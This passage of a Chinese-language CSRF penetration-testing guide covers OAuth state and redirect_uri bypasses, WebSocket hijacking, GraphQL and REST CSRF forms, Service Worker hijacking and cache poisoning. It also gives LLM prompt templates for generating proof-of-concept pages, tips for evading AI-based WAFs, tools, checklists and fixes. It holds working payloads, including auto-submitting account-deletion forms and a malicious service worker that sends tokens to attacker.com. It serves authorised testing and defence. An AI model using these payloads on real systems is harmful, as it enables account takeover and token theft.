function leak(token){ /* 发送到攻击者服务器 */ }
</script>
<script src="https://target.com/api/csrf-token?callback=leak"></script>
```

### 8.3 校验"Header存在即可"绕过
```javascript
// 服务端实现若为 if(req.headers['x-requested-with']) 即放行：
// fetch带任意值的自定义头即可（跨站fetch自定义头触发预检→需CORS，见8.1）
// 或表单直接提交同名头不可行——纯表单无法带自定义头，因此该缺陷常配合：
// 1. CORS预检放行（Allow-Headers含X-Requested-With）
// 2. Flash/老插件
// 3. 服务端代理去头/双写头混淆
```

### 8.4 CORS+CSRF完整链（Token读取→利用）
```
1. 测绘：向 /api/session 或 /profile 发跨域fetch（Origin: https://attacker.com）
2. 观察响应：是否含 Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true
3. 若是 → 读取Token所在页面/接口
4. 用Token+credentials:'include'发送状态改变请求（自定义Header+JSON均可行）
5. 若CORS仅放行某子域 → 检查该子域是否可接管/有XSS（链式）
6. 注意：CORS读取不到HttpOnly Cookie，但Token一般在meta/接口响应/非HttpOnly Cookie中
```

## 九、登录CSRF与OAuth授权码CSRF（账户劫持级）

### 9.1 登录CSRF深化
```
经典攻击（3.6节）：诱导受害者登录攻击者账户 → 窃取受害者在攻击者账户中填写的敏感信息
高级变体：
1. 登录后服务端不轮换Session → 会话固定（3.6进阶）
2. 登录CSRF + "登录即发邀请码/优惠券" → 攻击者批量薅羊毛
3. 登录CSRF + "新设备风控"绕过 → 攻击者账户无风控标记
4. 登录CSRF + 账户合并/找回逻辑 → 若攻击者账户与受害者手机号/邮箱可关联，反向接管
检测重点：登录接口是否有Token/CAPTCHA？登录后session id是否轮换？是否支持"自动登录"参数（预置token）
```

### 9.2 OAuth授权码CSRF（state缺失/静态）
```
攻击链（Account Linking CSRF → ATO）：
1. 攻击者用自己Google账户完成target.com的OAuth登录流程，在callback前截获 code
2. 诱导受害者访问 https://target.com/oauth/callback?code=ATTACKER_CODE（无需state校验）
3. target.com把攻击者的Google身份绑定到受害者账户
4. 攻击者随后"用Google登录" → 直接进入受害者账户（ATO）

检测步骤：
1. 发起正常OAuth登录，观察authorize请求是否带state参数
2. 若无state / state固定值 / state未在callback校验 → 漏洞
3. 用自己账户完整跑通流程截获code → 在另一浏览器（受害者身份）访问callback → 验证绑定/登录
4. 注意：部分实现callback校验state但不绑定Session（仅检查存在性）→ 同样可利用
```

### 9.3 redirect_uri校验绕过（Code泄露到攻击者域）
```
宽松校验模式与Payload：
1. 前缀匹配 startsWith("https://target.com"):
   https://target.com.attacker.com/callback
   https://target.com@attacker.com/callback
2. 后缀匹配 endsWith("target.com/callback"):
   https://attacker.com/target.com/callback   （攻击者托管该路径读取?code=）
3. 子域通配过宽 /^https:\/\/.*\.target\.com$/:
   任何可控子域（接管/用户内容托管 pages.target.com/x）
4. open redirect在已允许redirect_uri中：
   redirect_uri=https://target.com/redirect?next=https://attacker.com
   → code经 target.com/redirect 二次跳转携带到攻击者域（URL+Referer双通道）
5. 路径穿越：redirect_uri=https://target.com/callback/../attacker（规范化后越界）
6. 同形字/大小写/端口/尾斜杠规范化差异

验证：替换redirect_uri为恶意值，观察authorize是否放行、code是否到达攻击者监听
```

### 9.4 账户链接（Account Linking）CSRF
```
场景：用户已登录target.com，执行"绑定Google/微信账户"操作
1. 攻击者先用自己的第三方账户发起绑定流程，中途截获code
2. 诱导受害者点击 callback?code=ATTACKER_CODE
3. 受害者账户被绑定攻击者第三方身份 → 攻击者随时用该第三方登录受害者账户
4. 若同时存在"绑定即解锁第三方登录"逻辑，受害者原本密码登录仍然有效但攻击者已获得并行入口
检测：检查绑定接口/authorize是否校验state且state是否与会话绑定
```

### 9.5 新趋势：COAT/CORF与设备码钓鱼
```
- COAT（Cross-app OAuth Account Takeover，USENIX Security 2025）：
  集成平台（工作流自动化/智能家居/LLM插件）中，恶意App可劫持良性App的授权码流→平台级账户接管
  18个主流平台中11个受影响（含Microsoft/Google/Amazon生态）
  检测：平台OAuth架构是否区分App身份、token endpoint是否绑定client_id
- CORF（Request Forgery）：恶意App借平台令牌向第三方API发起伪造请求
- Device Code钓鱼（Proofpoint 2025-12）：利用OAuth设备码流（device authorization grant）诱导受害者授权，
  SquarePhish2等工具自动化；红队可复用于M365账户接管
- OAuth Security BCP持续更新（RFC 9700后续，2026在推进新草案）：
  强制state、严格redirect_uri精确匹配、code一次性+PKCE、绑定client
```

## 十、状态改变类API CSRF（WebSocket/GraphQL/REST）

### 10.1 跨站WebSocket劫持（CSWSH）
```javascript
// WebSocket握手是普通GET Upgrade（无预检、无自定义头限制），
// 旧浏览器/无SameSite Cookie时握手自动携带Cookie
var ws = new WebSocket('wss://target.com/ws?session=xxx');
ws.onopen = function() {
  ws.send(JSON.stringify({type:'delete_account'}));
  ws.send(JSON.stringify({type:'transfer', to:'attacker', amount:10000}));
};

检测要点：
1. 握手是否校验Origin（服务器应校验，很多实现不校验）
2. 是否依赖Cookie/Session认证握手（SameSite未设置则直接可打）
3. 业务消息是否含Token/是否校验操作权限
4. 服务端是否校验 Sec-WebSocket-Protocol/自定义头
注意：现代浏览器SameSite=Lax下跨站WS握手GET不携带Cookie，需Lax绕过前置或服务端用URL参数认证
```

### 10.2 GraphQL mutation CSRF
```html
<!-- GraphQL通常是 application/json → 触发预检；利用text/plain或query参数绕过 -->
<!-- 方法1：text/plain拼JSON（部分GraphQL服务容忍） -->
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{deleteAccount{id}}","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- 方法2：URL编码query（GET方式，若服务端允许mutation走GET） -->
<img src="https://target.com/graphql?query=mutation%7BchangeEmail(email%3A%22a%40e.com%22)%7Bid%7D%7D">
```
**检测重点：** GraphQL批量/内省（introspection）接口、mutation操作是否与query共用CSRF防护、batched mutations、persisted queries（缓存查询ID可被滥用）。

### 10.3 REST PATCH/DELETE/PUT CSRF
```html
<!-- 方法覆盖（最常用） -->
<form action="https://target.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>

<!-- 若后端直接接受POST语义映射到PATCH/DELETE（宽松路由）→ 普通form POST即可 -->
<!-- JSON PATCH：text/plain + JSON数组体 -->
<form action="https://target.com/api/user" method="POST" enctype="text/plain">
  <input name='[{"op":"replace","path":"/email","value":"attacker@evil.com"}]' value=''>
</form>
```
**批量/幂等操作：** 搜索支持`?ids=1,2,3`批量删除/更新的GET型接口、`action=delete`参数型接口——批量接口往往遗漏Token校验。

### 10.4 异步任务/回调类CSRF
```
- 任务队列触发接口（导出报表、发送邮件、触发流水线）
- Webhook回调地址修改（改到攻击者服务器窃取事件数据）
- 订阅/退订类接口（批量退订造成业务损失）
- 定时任务/Cron配置（持久化后门）
这些接口常"非表单友好"且无Token，但业务影响大，属高价值测试目标
```

## 十一、Service Worker劫持与缓存投毒CSRF

### 11.1 Service Worker绕过SameSite（浏览器缺陷面）
```
情报（Chromium issue 429585229 / 470574526，2025）：
1. 目标注册了Service Worker时，SW拦截请求并fetch()转发，SameSite=Strict/Lax Cookie
   可能被不当包含在跨站请求中（Chromium被报为Won't Fix/未复现，但Firefox/特定路径下仍值得实测）
2. 任何使用SW且依赖SameSite做CSRF防护的站点存在被绕过风险
3. SW自身"什么都不做"只需注册在目标域即可构成攻击面（470574526场景：
   DevTools打开后重发请求时Strict Cookie被携带）

实战思路：
- 检测目标是否注册SW（/sw.js、navigator.serviceWorker）
- 若目标同时依赖SameSite且SW代码会把请求转发给fetch → 构造跨站提交并验证Cookie是否携带
- 若攻击者能注册/控制SW（见11.2）→ 直接同源执行任意JS → 完全控制
```

### 11.2 Service Worker劫持（注册恶意SW）
```
前提：目标存在任意XSS、或JSONP允许跨域注册SW、或Service-Worker-Allowed头放宽scope
1. 在受害者浏览器注册攻击者SW：
   <script>
   navigator.serviceWorker.register('https://attacker.com/sw.js', {scope:'/'});
   </script>
   // 跨域注册需SW脚本支持CORS（ACAO:*）+ MIME text/javascript
2. 恶意sw.js：拦截所有请求，窃取Authorization/X-CSRF-Token头与响应，或修改响应注入恶意脚本
3. scope扩大：目标响应含 Service-Worker-Allowed: / 时，/blog下的XSS可注册根scope SW
4. 持久性：SW生命周期长于单次会话，可作为持久后门（配合Token窃取→任意CSRF/XSS）

恶意SW示例（Token窃取）：
// sw.js
self.addEventListener('fetch', function(event) {
  var token = event.request.headers.get('X-CSRF-Token') ||
              event.request.headers.get('Authorization');
  if (token) { fetch('https://attacker.com/collect?t=' + btoa(token)); }
  event.respondWith(fetch(event.request));
});
```

### 11.3 缓存投毒（Cache Poisoning）→ CSRF
```
1. 投毒同源缓存（CDN/浏览器HTTP缓存），使受害者访问 target.com 时加载被投毒页面/JS
2. 投毒JS中植入"页面加载即向敏感接口发同源请求"逻辑：
   同源请求自动携带全部Cookie + 可从页面DOM读取Token → 等价于同源XSS执行
3. 变体：投毒登录后页面（含CSRF Token的页面）→ 读取被投毒响应中的Token
4. 利用条件：缓存键未包含关键请求头（X-Forwarded-Host/Host/自定义头反射）
   GET /js/app.js
   Host: target.com                    → 命中缓存键？若Host未入键：
   Host: attacker.com → 响应中的URL/脚本引用被替换为attacker.com → 缓存污染
5. 与CSRF组合：Cache poisoning + CSRF = "受害者无需点击，访问首页即中招"
```

### 11.4 CSPT2CSRF（客户端路径穿越→CSRF，Doyensec 2025研究）
```
概念：前端从URL参数/DOM读取用户可控值拼接API路径（Client-Side Path Traversal），
攻击者控制该输入使"合法API请求"被重路由到敏感端点。由于请求由前端同源发起，
自动携带Cookie且自带Token → 所有CSRF防护全部失效

示例（笔记应用）：
// 前端代码（有CSPT缺陷）：
// const id = new URLSearchParams(location.search).get('id');
// fetch(`/api/notes/${id}`, {method:'POST', body: draft})

// 攻击者构造：
https://target.com/editor?id=../../admin/delete-all
// → 前端请求 POST /api/notes/../../admin/delete-all → 规范化后 /api/admin/delete-all
// 请求由target.com同源前端发起 → Cookie+Token完备 → 删除所有笔记

检测：
1. 在前端JS中找 fetch/XHR/axios 等API调用，追踪URL是否拼接用户可控输入（location.hash/search、postMessage、DOM值）
2. 拼接点是否可注入 ../ 或 / 改变路径
3. 是否存在高价值sink（删除/转账/改密/权限）
4. 官方提供Burp扩展辅助扫描
```

## 十二、CSRF→账户接管→业务影响完整攻击链

### 12.1 攻击链设计方法论
```
链式利用 = 找出"低危CSRF"如何升级为"高危业务影响"：
CSRF(单项操作) + 业务逻辑缺陷 + 认证/授权缺陷 → 账户接管/资金损失/数据泄露
每条链都要明确：入口（CSRF点）→ 中间跳板（逻辑缺陷）→ 终点（业务影响）
```

### 12.2 实战链1：OAuth无state → 账户接管
```
1. 发现 target.com/oauth/callback 无state校验（9.2节）
2. 攻击者用自己Google完成OAuth绑定，截获code
3. 诱导受害者访问 callback?code=ATTACKER_CODE → 受害者账户绑定攻击者Google
4. 攻击者"Sign in with Google" → 进入受害者账户
5. 业务影响：改绑定邮箱 → 密码重置 → 完全接管；可读受害者数据/资金操作
修复锚点：state随机+绑定Session+一次性+PKCE
```

### 12.3 实战链2：JSON CSRF + 导出接口 → 数据泄露
```
1. 目标存在 GET /api/export?type=all（导出全量数据，无CSRF Token，仅Cookie认证）
2. Lax下GET顶级导航携带Cookie → <a>自动点击即可触发导出
3. 导出产物在站内下载路径可被CORS读取（8.1节）或通过开放重定向外带
4. 业务影响：批量数据泄露
修复锚点：写操作加Token+导出链接短期随机令牌+禁止CORS
```

### 12.4 实战链3：Login CSRF + 免密登录令牌 → 会话接管
```
1. 目标登录接口无Token且支持"magic link/一次性登录令牌"（URL携带）
2. 攻击者先申请令牌（token已知），通过CSRF让受害者完成登录
3. 登录后服务端不轮换session → 攻击者使用预置session或已知令牌直接进入
4. 业务影响：完整会话接管
修复锚点：登录接口加CSRF防护+登录后session轮换+令牌一次性
```

### 12.5 业务影响分级与报告
| 攻击链终点 | 严重级别 | 说明 |
|-----------|---------|------|
| 账户完全接管（含2FA绕过） | 严重 | OAuth绑定/改邮箱+密码重置链 |
| 资金转移/支付 | 严重 | 直接经济损失 |
| 敏感数据批量导出 | 高 | 数据泄露+合规风险 |
| 权限提升（管理员） | 高 | 横向控制 |
| 账户设置篡改（改密/2FA） | 中-高 | 接管前置 |
| 批量社交操作（关注/评论/发消息） | 中 | 水军/钓鱼扩散 |
| 注销/DoS | 低-中 | 可用性影响 |

## 十三、AI大模型结合攻防

### 13.1 AI辅助生成CSRF PoC页面
```
把Burp捕获的原始请求（方法/URL/Headers/Body）交给LLM，要求输出可直接保存为HTML的PoC：
Prompt模板：
"下面是从目标站点捕获的CSRF敏感请求，请生成一个可直接在浏览器打开的HTML PoC文件，
要求：1) 自动提交表单 2) 保留全部参数与Cookie行为 3) 若Content-Type为application/json，
尝试enctype=text/plain拼JSON方案 4) 同时生成GET载体（img/link）版本 5) 给出多浏览器（Chrome/Firefox）
与SameSite Lax/Strict的预期差异说明。请求如下：[粘贴原始请求]"

LLM可自动完成的变体生成：
- 方法覆盖（_method=DELETE/PUT）
- text/plain JSON 拼接（input name/value 边界技巧）
- no-referrer meta / sandbox iframe / data: URL 变体
- 多步表单串联（iframe target链式提交）
- OAuth callback 构造（code/state/redirect_uri参数篡改）
```
**注意：** LLM生成的PoC必须人工核对后再测试——LLM可能遗漏Cookie Domain细节或生成错误边界拼接。

### 13.2 LLM审计Token校验逻辑
```
把服务端Token校验代码（Synchronizer/Double Submit/HMAC/中间件）交给LLM做代码审计：
Prompt模板：
"以下是CSRF Token校验实现代码，请以红队视角审计：
1) Token是否仅校验存在性/长度/格式而非值？
2) Token是否绑定Session与User？
3) 校验是否仅针对特定HTTP方法/Content-Type（可被方法覆盖/换Content-Type绕过）？
4) 双提交实现中Cookie是否可被注入/覆盖（Domain/Path/前缀缺失）？
5) HMAC实现是否存在长度扩展/算法混淆/时序漏洞？
6) 是否存在校验顺序缺陷（先执行操作后校验）？
请逐条给出'可利用/不可利用/需进一步验证'结论与对应PoC思路。
代码：[粘贴代码]"

适用场景：
- 逆向JS前端Token生成逻辑（Angular/Django/Rails/Spring Security）
- 审计中间件顺序（Token校验在鉴权前还是后）
- 识别"全局开关/测试模式"后门校验分支
```

### 13.3 AI驱动CSRF检测扫描
```
现代工具链（2025-2026）：
- Strix（开源，~24k stars）：多AI代理协作，浏览器自动化测试XSS/CSRF等客户端漏洞，
  自动生成PoC并在Docker沙箱验证（无假阳性）
  pip install strix-agent; strix --target https://target.com
- XBOW（商业）：HackerOne全球榜首，数千并发代理自动攻击Web应用，发现大量0day
- Shannon（开源，Claude Agent SDK）：白盒+黑盒混合，源码驱动攻击策略，自动验证
- Burp+LLM插件：捕获请求→LLM生成PoC→人工复核（红队标配工作流）

AI扫描自动化流程（建议）：
1. 爬取应用，识别全部状态改变接口（方法/参数/是否带Token）
2. 对每个接口生成"无Token/空Token/复用Token/换用户Token/换方法"测试矩阵
3. 结合SameSite/Cookie审计结果自动选择绕过策略（Lax窗口/方法覆盖/双提交注入）
4. LLM分析服务端响应差异（403 vs 200）判断校验逻辑
5. 输出PoC + 人工复核 + 沙箱验证
局限（arXiv 2510.14700实证）：LLM agent在"认证障碍/复杂环境"下成功率大幅下降（>33.3%），
复杂业务流仍需人工，AI产出必须人工兜底
```

### 13.4 AI在防御侧的反制（攻防视角）
```
- 目标若使用LLM/AI Agent处理请求（自动化客服/操作机器人），其"会话"往往非Cookie而是
  API Token/对话ID → SameSite完全失效，CSRF演变为"诱导AI执行操作"（prompt注入联动）
- 目标若用LLM审查请求（WAF-AI），可通过语义混淆（编码/分块/多步诱导）绕过LLM理解
- 检测自身PoC是否被AI-WAF拦截时，可用LLM生成混淆变体批量对比
```

## 十四、自动化工具链

### 14.1 Burp Suite
```
- Engagement tools → Generate CSRF PoC：一键生成可复制HTML PoC（含Token去除警告）
- CSRF Token handling（Session handling rules）：Repeater/Intruder自动提取并更新Token
- Match and Replace：批量改Token/Referer/Origin测试绕过
- 403 Bypasser插件：方法覆盖/路径规范化自动测试
- CSPT2CSRF扩展（Doyensec官方）：扫描前端CSPT→CSRF链
- 自定义Python扩展：自动提取Token并构造跨域fetch PoC
```

### 14.2 专用工具
| 工具 | 用途 |
|------|------|
| XSRFProbe | CSRF自动化检测（Token绕过/Referer缺失/方法覆盖） |
| OWASP ZAP（+CSRF插件） | 主动扫描CSRF，配合AI插件 |
| Burp CSRF PoC Generator | 快速生成PoC |
| SameSite测试沙箱（samesite-sandbox.glitch.me） | 验证浏览器SameSite行为 |
| Chromium/Firefox headless + Playwright | 多浏览器自动化验证PoC（Cookie携带行为差异） |
| Cookie-Editor/BrowserStack | 多浏览器Cookie行为对比测试 |
| Strix / XBOW / Shannon | AI驱动检测扫描（13.3节） |

### 14.3 XSRFProbe使用
```bash
# 基础扫描（需登录Cookie）
xsrfprobe -u https://target.com --cookie "session=xxx"

# 深度分析模式
xsrfprobe -u https://target.com/api -c "cookies.txt" --skip-analysis

# 输出HTML报告
xsrfprobe -u https://target.com --raw http-request.txt -p
```

### 14.4 多浏览器验证矩阵（必做）
```
同一PoC必须在以下环境验证：
- Chrome/Edge（最新）：Lax默认+2分钟窗口语义
- Firefox（最新）：Lax默认+宽泛的Lax+POST例外（与Chrome窗口规则不同）
- Safari（含iOS）：ITP强限制第三方Cookie，SameSite=None也受限
- 无头浏览器模拟老浏览器/WebView（UA/无SameSite支持）
- curl/httpx（非浏览器）：验证"无Sec-Fetch-*头"是否被服务端放行
```

## 十五、CSRF测试检查清单

### 15.1 侦察与测绘
- [ ] 枚举全部状态改变接口（改密/改邮箱/转账/权限/删除/配置/Webhook）
- [ ] 确认认证载体：Cookie（受SameSite影响）/ Header / Web Storage
- [ ] 审计全部Set-Cookie：SameSite属性、Domain、Path、HttpOnly、Secure、__Host-前缀、Partitioned
- [ ] 判断浏览器默认行为下的Cookie携带边界（Lax/Strict/None）
- [ ] 识别CSRF防护类型：Synchronizer / Double Submit / HMAC / Referer-Origin / Header / Fetch-Metadata

### 15.2 Token测试
- [ ] 删除Token是否通过
- [ ] 空Token/等长任意值是否通过
- [ ] 其他用户/其他会话Token是否通过
- [ ] Token可预测性分析（采集样本统计熵）
- [ ] Token是否可重用（一次性验证）
- [ ] Token在Cookie/表单/Header/GET参数各位置的校验差异
- [ ] 把Token移到不同位置是否仍通过
- [ ] 多步流程各步的Token校验覆盖
- [ ] 方法条件校验绕过（_method/HEAD/OPTIONS/GET）
- [ ] Content-Type切换绕过（text/plain等）

### 15.3 SameSite与浏览器差异
- [ ] 无SameSite属性时各浏览器默认行为验证
- [ ] Lax下GET型接口（顶级导航）CSRF
- [ ] Chrome Lax+POST 2分钟窗口利用
- [ ] 方法覆盖绕过Lax（_method=GET）
- [ ] 同站Gadget（子域XSS/JSONP/DOM open redirect）
- [ ] 子域接管与父域Cookie注入
- [ ] 跨站WebSocket握手（CSWSH）
- [ ] Service Worker存在性及SameSite绕过验证
- [ ] Safari ITP / Chrome第三方Cookie淘汰对PoC的影响

### 15.4 校验绕过
- [ ] Referer缺失/空/包含匹配/正则缺陷/@符号绕过
- [ ] Origin null / 缺失 / 反射 / 多值绕过
- [ ] Open Redirect联动
- [ ] 双提交Cookie注入（子域/CRLF/Tossing/HTTP混写）
- [ ] HMAC双提交的长度扩展/算法混淆/时序
- [ ] CORS错误配置读取Token（反射Origin+credentials）
- [ ] JSONP接口泄露Token
- [ ] 自定义Header"存在即放行"缺陷

### 15.5 高级场景
- [ ] Login CSRF + 会话固定
- [ ] Logout CSRF（配合钓鱼）
- [ ] OAuth授权码CSRF（state缺失/静态/未绑定Session）
- [ ] OAuth redirect_uri校验绕过（前缀/后缀/正则/穿越/open redirect）
- [ ] 账户绑定CSRF（Account Linking）
- [ ] GraphQL mutation CSRF（text/plain/GET）
- [ ] REST PATCH/DELETE方法覆盖与批量接口
- [ ] 异步任务/Webhook/回调类接口
- [ ] 多步表单Token传递缺陷
- [ ] Service Worker劫持与缓存投毒
- [ ] CSPT2CSRF（前端路径穿越）
- [ ] AI-WAF语义混淆绕过

### 15.6 验证与报告
- [ ] 使用只读/无害参数验证（不真实删数据/转账）
- [ ] 多浏览器重复验证（Chrome/Firefox/Safari）
- [ ] 评估完整业务影响链（CSRF→接管→损失）
- [ ] 记录复现步骤与PoC（供开发修复验证）

## 十六、修复建议

- **Synchronizer Token（首选）**：每个会话独立随机Token，服务端存储比对，Token一次性（操作成功后失效），Token随机性使用`secrets.token_urlsafe(32)`级熵
- **Token绑定三维度**：绑定Session、绑定User、绑定请求（防方法/路径切换绕过），校验放在业务操作**之前**
- **SameSite严格化**：认证Cookie设置`SameSite=Strict`（或至少`Lax`）+ `Secure` + `HttpOnly`；高价值操作场景可对Cookie使用`__Host-`前缀（禁止Domain，防子域注入）
- **双提交Cookie加固**：必须使用**签名/HMAC双提交**（而非裸比对），签名含密钥+时间戳，校验Cookie名使用`__Host-`前缀防覆盖，避免子域可写
- **Origin/Referer校验（纵深防御）**：状态改变请求校验`Origin`头（严格匹配scheme+host+port，拒绝null/缺失）；缺失时回退Referer；两者均缺失拒绝
- **Fetch Metadata策略**：对非安全方法+`Sec-Fetch-Site: cross-site`一律拒绝（.NET 11/Rails 8.2/Laravel 13原生支持或自研中间件）；注意旧浏览器/WebView无此头时的降级策略（保留Token校验）
- **CORS收敛**：禁止`Access-Control-Allow-Origin: *`+credentials组合、禁止反射任意Origin、白名单精确到子域、`Access-Control-Allow-Headers`最小化、禁止信任`null`
- **写操作禁止GET**：所有状态改变走POST/PUT/PATCH/DELETE，禁止`_method`/`X-HTTP-Method-Override`覆盖（或覆盖后仍强制Token校验）
- **关键操作二次验证**：转账/改密/改邮箱/解绑手机要求重新输入密码/OTP/2FA（防CSRF同时防XSS复用）
- **登录防护**：登录接口加CSRF防护（Login CSRF）、登录后强制轮换Session ID、支持"本设备登录确认"；OAuth严格state（随机+绑定Session+一次性）+PKCE（Proof Key for Code Exchange）
- **OAuth加固**：`redirect_uri`精确匹配注册白名单（禁止前缀/后缀/通配匹配）、code一次性且绑定client_id与PKCE、`state`必须随机且绑定Session并校验、账户绑定操作二次确认
- **WebSocket加固**：握手校验`Origin`头（拒绝跨站）、握手携带一次性Token（而非仅凭Cookie）、业务消息按用户权限校验
- **GraphQL加固**：mutation禁止GET、统一CSRF Token校验（不区分query/mutation）、禁用批量执行敏感mutation、persisted query需鉴权校验
- **Cookie属性基线**：认证Cookie一律`Secure; HttpOnly; SameSite=Strict(Lax)`；涉及第三方嵌入的Cookie单独使用`SameSite=None; Secure; Partitioned`且敏感度最低化
- **XSS根除（前置条件）**：XSS可读取Token/直接同源请求，使全部CSRF防护失效——CSP、输入输出编码、HttpOnly、SRI完整性校验
- **安全响应头**：`X-Frame-Options: DENY`/CSP frame-ancestors（防点击劫持组合）、`Referrer-Policy`、正确配置crossdomain.xml（Flash）
- **纵深防御分级**：高价值操作=Token+SameSite+二次验证；中价值=Token+SameSite；低价值=SameSite——每层独立可审计
- **监控与告警**：记录Origin/Referer异常请求、高频重复状态改变请求、异常跨站模式；将CSRF攻击特征纳入WAF与SIEM

## 注意事项

- **仅限授权测试/合规声明**：本技能所有技术仅适用于**已获得书面授权的渗透测试、红队演练、漏洞赏金与安全评估**。未授权对他人系统进行CSRF测试违反《中华人民共和国网络安全法》《数据安全法》《个人信息保护法》及相关法律法规，可能构成非法侵入计算机信息系统罪。使用即表示你确认：①目标在授权范围内 ②已获甲方书面授权 ③遵守目标平台漏洞披露规则（如SRC/漏洞赏金政策）
- **PoC影响评估**：构造PoC时避免执行真实破坏性操作（真实转账/删除/改密），使用无害参数（如改昵称、添加测试项）或测试环境验证；涉及OAuth/账户绑定的测试使用专用测试账号
- **浏览器差异强制验证**：SameSite行为在Chrome/Firefox/Safari/Edge/WebView/老浏览器存在显著差异，同一PoC必须多浏览器验证后才可定性"可利用"
- **数据保护**：不读取/下载/外带任何真实用户数据；测试中接触的敏感信息（Token/凭据）用完即销毁
- **清理痕迹**：测试完成后清理写入的Cookie、缓存、Service Worker、Webhook配置、测试账号与数据
- **危害定级审慎**：CSRF通常需用户交互，定级需结合业务影响链（是否可达账户接管/资金损失）；单个低危CSRF链式后可升级，报告需完整呈现攻击链
- **环境隔离**：不在生产环境进行破坏性验证；优先使用只读、可回滚的验证方式（如修改后立即还原）
- **情报时效**：本技能基于2026年公开情报（Chromium SameSite议题、Doyensec CSPT2CSRF、USENIX Security 2025 COAT/CORF、OAuth BCP草案、Fetch Metadata框架集成、AI攻防工具链）；浏览器语义与框架防护持续演进，测试前复核目标环境与浏览器版本的最新行为

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
